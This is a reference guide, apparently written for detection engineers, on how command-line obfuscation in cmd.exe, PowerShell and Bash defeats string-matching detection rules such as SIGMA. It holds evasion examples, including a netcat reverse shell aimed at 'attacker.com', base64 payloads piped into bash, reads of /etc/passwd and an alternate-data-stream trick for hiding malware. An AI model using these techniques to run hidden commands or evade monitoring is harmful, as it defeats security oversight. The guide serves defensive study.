# Command-Line Obfuscation

Command-line obfuscation techniques alter the syntactic representation of commands without changing their semantic execution. Detection rules that rely on exact string matching or simple substring patterns are vulnerable to these techniques. 

## Windows cmd.exe Obfuscation

The Windows command interpreter (cmd.exe) has numerous parsing quirks exploitable for evasion:

- **Caret insertion**: The caret `^` is cmd.exe's escape character and is stripped during parsing. `c^e^r^t^u^t^i^l` executes as `certutil`. Carets can be inserted between any characters: `p^o^w^e^r^s^h^e^l^l`. Detection rules using `|contains: 'certutil'` miss this entirely.
- **Environment variable expansion**: `%comspec%` expands to `C:\Windows\system32\cmd.exe`. Attackers use `%comspec:~-3%` (substring extraction) to build strings character by character. `%OS:~0,1%` extracts the first character of the OS variable.
- **SET variable tricks**: `set a=pow& set b=ershell& call %a%%b%` constructs `powershell` from fragments across multiple SET commands. The `call` keyword triggers variable expansion.
- **FOR loop abuse**: `for /f %i in ('command') do %i` executes output of one command as another. Complex nesting obfuscates intent.
- **Comma and semicolon substitution**: cmd.exe treats `,` and `;` as argument delimiters equivalent to spaces in many contexts: `cmd,/c,calc` works. `cmd;/c;calc` also works.
- **Double quotes in paths**: `""c:\windows\system32\calc.exe""` with extra quotes still executes. Variable quoting patterns break string matching.
- **Delayed expansion**: `cmd /v:on /c "set a=calc&!a!"` uses delayed variable expansion with `!var!` syntax instead of `%var%`.
- **Double quotes**: `n""et us""er` — empty quotes ignored in many contexts
- **Environment variable**: `%COMSPEC:~-3%` extracts substring from env vars
- **Delayed expansion**: `!var!` vs `%var%` — can bypass static analysis
- **Variable overwrite**: `set a=net&& set b=user&& %a% %b%`
- **FOR loop construction**: `for /f %i in ('set') do @echo %i`
- **Pipe/redirect chain**: Split command across multiple pipes

## PowerShell Obfuscation

PowerShell's .NET foundation provides rich string manipulation capabilities:

- **Backtick escape**: `` `t ``, `` `n ``, `` `r `` are tab, newline, carriage return. But backtick before normal characters is ignored: `` Inv`oke-Exp`ression `` works as `Invoke-Expression`.
- **String concatenation**: `'Invoke-'+'Expression'` or `"Invoke-" + "Expression"`.
- **-join operator**: `('I','n','v','o','k','e') -join ''` builds strings from character arrays.
- **Format operator (-f)**: `'{0}{1}{2}' -f 'Inv','oke-Ex','pression'` constructs strings from indexed placeholders. Index reordering further obscures: `'{2}{0}{1}' -f 'ke-','Expression','Invo'`.
- **[char] array casting**: `[char[]](73,110,118,111,107,101) -join ''` builds strings from ASCII/Unicode code points.
- **SecureString conversion**: Using `ConvertTo-SecureString` and back to plaintext to obscure strings.
- **Invoke-Expression aliases**: `iex`, `& (gcm *ke-exp*)`, `. (gi alias:\iex)` all invoke expressions without the literal string `Invoke-Expression`.

## Bash/Linux Obfuscation

Unix shells offer distinct obfuscation vectors:

- **Backslash continuation**: `cu\rl` is interpreted as `curl`. The backslash escapes the following character, but for normal characters this is a no-op.
- **$IFS variable**: Internal Field Separator (default: space/tab/newline). `cat${IFS}/etc/passwd` replaces space with `$IFS`. Also: `cat$IFS/etc/passwd`, `{cat,/etc/passwd}`.
- **Brace expansion**: `{cat,/etc/passwd}` expands to `cat /etc/passwd`. `{nc,-e,/bin/sh,attacker.com,4444}` constructs reverse shell commands.
- **Hex/octal escaping**: `$'\x63\x61\x74' /etc/passwd` uses hex escapes to spell `cat`. Octal: `$'\143\141\164'`.
- **Variable assignment**: `a=c;b=at;$a$b /etc/passwd` builds `cat` from fragments.
- **Base64 piping**: `echo Y2F0IC9ldGMvcGFzc3dk | base64 -d | bash` decodes and executes.
- **Wildcards and globbing**: `/???/c?t /etc/passwd` uses `?` wildcards. `/???/??t` matches `/bin/cat`.
- **Here-strings and process substitution**: `bash <(echo 'malicious command')`.
- **Single-quote break**: `w'h'o'a'm'i` — quotes around letters are ignored
- **Backslash escape**: `w\ho\am\i`
- **Variable splicing**: `a=who;b=ami;$a$b`
- **$() and backtick substitution**: `$(echo whoami)`
- **Hex encoding**: `$'\x77\x68\x6f\x61\x6d\x69'` → "whoami"
- **Base64 pipe**: `echo d2hvYW1p | base64 -d | sh`
- **IFS manipulation**: `IFS=X;CMD=whoXami;$CMD`
- **Brace expansion**: `{echo,hello}` — some shells expand this

## Argument Obfuscation

Flag and argument formatting varies across platforms:

- **Short vs long flags**: `-e` vs `--exec`, `-f` vs `--file`. Rules matching one form miss the other.
- **Windows slash vs dash**: `cmd /c` and `cmd -c` may both work depending on the binary. PowerShell accepts both `-ExecutionPolicy` and `/ExecutionPolicy` in some contexts.
- **Partial parameter names**: PowerShell allows parameter abbreviation: `-ExecutionPolicy`, `-ExecutionPol`, `-ep`, `-exec` all work as long as the abbreviation is unambiguous.
- **Equals sign in arguments**: `--output=file` vs `--output file`. Some parsers accept both.
- **Concatenated short flags**: `-abc` vs `-a -b -c` varies by tool. Some tools treat these differently.
- Some rules match on specific argument patterns like `-enc` or `/transfer`
- Arguments can be split: `certutil  -url   cache` (extra spaces)
- Case variation: `-EncodedCommand` vs `-ENCODEDCOMMAND` vs `-encodedcommand`
- Slash/dash interchange on Windows: `/enc` vs `-enc` (many tools accept both)
- Equal sign: `--output=file` vs `--output file`

## Process Name Evasion

- **Rename binary**: Copy cmd.exe to notcmd.exe — same functionality
- **Symlink**: `ln -s /bin/bash /tmp/definitely_not_bash`
- **PATH manipulation**: Place custom binary earlier in PATH
- **NTFS Alternate Data Streams**: `type malware.exe > legit.txt:hidden.exe`
- **OriginalFileName mismatch**: Compiled binary OriginalFileName differs from disk name

## Path Obfuscation

File paths can be obfuscated to evade path-based matching:

- **8.3 short names**: `C:\PROGRA~1\` for `C:\Program Files\`. `C:\WINDOW~1\System32\` for `C:\Windows\System32\`. Generated automatically by NTFS. `dir /x` shows short names.
- **UNC paths**: `\\127.0.0.1\C$\Windows\System32\cmd.exe` accesses local files via UNC. Also: `\\?\C:\Windows\System32\cmd.exe` uses extended-length path prefix.
- **Environment variables**: `%SystemRoot%\System32\cmd.exe`, `%TEMP%\payload.exe`, `%APPDATA%\Microsoft\payload.dll`. Expands at runtime, invisible to static path matching.
- **Double dots and traversal**: `C:\Windows\System32\..\System32\cmd.exe` resolves correctly but defeats exact path matching.
- **Forward slashes on Windows**: `C:/Windows/System32/cmd.exe` works in many Windows contexts. Mixed separators: `C:\Windows/System32\cmd.exe`.
- **Case variation**: Windows paths are case-insensitive. `c:\WINDOWS\system32\CMD.EXE` matches `C:\Windows\System32\cmd.exe`.
- **Recycle bin**: Windows recycle bin `C:\$Recycle.bin\<SID>` is writable as <SID> user and often omitted.

## Unicode and Encoding Tricks

- **Homoglyph substitution**: Unicode characters visually identical to ASCII (Cyrillic 'a' U+0430 vs Latin 'a' U+0061). May bypass string comparison while appearing identical.
- **UTF-16 encoding**: PowerShell `-EncodedCommand` uses UTF-16LE Base64. Null bytes between ASCII characters break simple pattern matching.
- **Null byte insertion**: In some parsers, null bytes `\x00` are ignored or act as string terminators, truncating logging output while allowing full execution.
- **Whitespace variations**: Non-breaking space (U+00A0), zero-width space (U+200B), tabs, and other Unicode whitespace may be treated as valid separators by interpreters but not by detection rules.

## Detection Implications

- Rules using `|contains` on CommandLine are vulnerable to all obfuscation above
- `|re` (regex) with case-insensitive flag is more resilient but still bypassable
- Rules should combine CommandLine matching with other indicators (parent process, file events)
- The `|windash` SIGMA modifier helps with slash/dash but not other obfuscation